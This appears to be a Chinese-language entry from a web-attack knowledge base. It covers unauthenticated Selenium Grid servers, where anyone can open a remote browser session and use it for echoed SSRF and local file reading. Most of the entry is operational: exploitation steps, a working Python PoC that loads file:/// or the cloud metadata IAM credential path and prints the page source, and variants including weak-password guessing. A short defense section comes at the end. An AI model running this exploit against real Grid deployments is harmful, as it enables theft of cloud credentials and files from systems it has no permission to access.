---
id: web-generic-ssrf-selenium-grid-remote-webdriver-file-read
title: Selenium Grid 未授权 /wd/hub 新建会话回显 SSRF：Remote WebDriver 访问内网 URL 或 file:/// 并读 page_source
type: scenario
domain: web
path: web/generic/ssrf
technique: selenium-grid-unauth-remote-webdriver-ssrf-file-read
aliases:
- Selenium Grid SSRF
- /wd/hub
- Remote WebDriver
- Selenium 未授权
- page_source 回显
- file:// 读取
tags:
- web
- ssrf
- selenium
- grid
- unauth
- file-read
- internal-network
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V530
  verified_at: '2026-11-11T17:03:03+08:00'
  notes: 已对照原文全文与6张图核对。原文 Selenium Grid 段：未授权可直接新建 session 实现回显 SSRF；图03 为 Selenium Grid 4.3.0（revision a4995e2c09*）UI，Sessions 0/Max Concurrency 1；原文 Python 代码 url=http://xxxxxxx:4444/wd/hub、ChromeOptions --no-sandbox/-ignore-certificate-errors/--allow-file-access-from-files、set_page_load_timeout(3)、dr.get('file:///')、注释掉的 dr.get('http://xxxxx/latest/iam/')、print(dr.page_source) 与卡片 PoC 一致；POST /wd/hub/session 为 WebDriver 建会话标准路径。原文无 SSRF/文件读取输出截图，卡片 confidence=medium 并在 notes 场景中如实标注，但代码为客户端到 Grid 的完整可执行链（非仅有原语），故保留。4.3.0 仅为目标环境截图版本，未写入 affected_versions 正确。dedup=new，库内无 Selenium Grid SSRF 卡，候选均为其他产品入口，非同链。未对任何目标发起请求。
---

## 一句话结论

暴露在公网且无认证的 Selenium Grid 允许任何人通过 `/wd/hub` 新建浏览器会话；攻击者用 Remote WebDriver 让 Grid 节点访问内网 URL（含云元数据 IAM 接口）或 `file:///` 本地路径，再读取 `driver.page_source`，即可获得回显 SSRF 与受限文件读取能力。

## 原理

- Selenium Grid 的设计是接收远程 WebDriver 协议请求，把浏览器操作分发到注册的节点；`POST /wd/hub/session` 创建会话后，`driver.get(url)` 会让节点上的浏览器访问目标 URL。
- 浏览器运行在 Grid 节点主机上，能访问节点所在内网与云元数据；`driver.page_source` 返回渲染后的 HTML/文本，形成回显 SSRF。`file:///` 协议在未禁用时可读取节点本地文件（原文用 `file:///` 探测根目录）。
- 认证缺失是核心：Grid 默认不启用 Basic Auth/反向代理鉴权，暴露 4444 端口即可被匿名创建会话；节点浏览器参数还可由攻击者通过 capabilities 控制（如 `--no-sandbox`、`--allow-file-access-from-files`），进一步降低文件访问限制。
- 原文截图显示目标为 Selenium Grid 4.3.0（revision a4995e2c09*），会话数 0、最大并发 1，说明可直接占用节点。

## 触发条件

- Selenium Grid Hub/Standalone 的 4444（或 `/wd/hub`）端口可访问且无认证；
- 节点可访问内网或云元数据，浏览器允许访问目标（HTTP/HTTPS/file）；
- 创建会话所需浏览器可用（Chrome/Firefox 等），未被并发/配额限制完全占满；
- `file://` 读取要求浏览器未禁用本地文件访问。

## 利用步骤

1. 访问 `http://target:4444/ui/` 或 `/wd/hub/status` 确认 Grid 未授权与版本；
2. 用 Python 连接 Remote WebDriver，设置 `--no-sandbox`、`--allow-file-access-from-files` 等参数；
3. `dr.get('http://<metadata>/latest/meta-data/iam/security-credentials/')` 或 `dr.get('file:///')`；
4. `print(dr.page_source)` 获取回显；对 IAM 接口可先列角色名再读凭据路径；
5. 结束后 `dr.quit()` 释放会话，避免占满并发。

## PoC

```python
from selenium import webdriver
url = 'http://target:4444/wd/hub'
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('-ignore-certificate-errors')
chrome_options.add_argument('--allow-file-access-from-files')
dr = webdriver.Remote(url, options=chrome_options)
dr.set_page_load_timeout(3)
dr.get('file:///')
# dr.get('http://100.100.100.200/latest/meta-data/iam/security-credentials/')
print(dr.page_source)
```

## 变体与关联

- 可换成 Firefox/Edge 等浏览器；不同浏览器对 `file://` 与跨域限制不同；
- 除 page_source，还可截图、下载文件、执行 JS 读取页面内容；
- 同类未授权回显 SSRF 组件：Consul 健康检查、Cerebro `/rest/request`、Grafana 数据源、ClickHouse `url()`（库内均有独立卡）；
- 若 Grid 有 Basic Auth，可尝试默认/弱口令或从配置泄露获取。

## 检测与防御

- Selenium Grid 不应直接暴露公网；必须启用认证（反向代理 Basic Auth/网关鉴权）并限制来源 IP；
- 节点容器化并限制网络（禁止访问元数据与内网管理网段）、以非 root 运行、禁用 `file://`；
- 监控异常会话创建与对元数据/内网地址的导航；限制并发与会话时长；
- 云侧启用 IMDSv2/等效防护，降低元数据直接可读的风险。
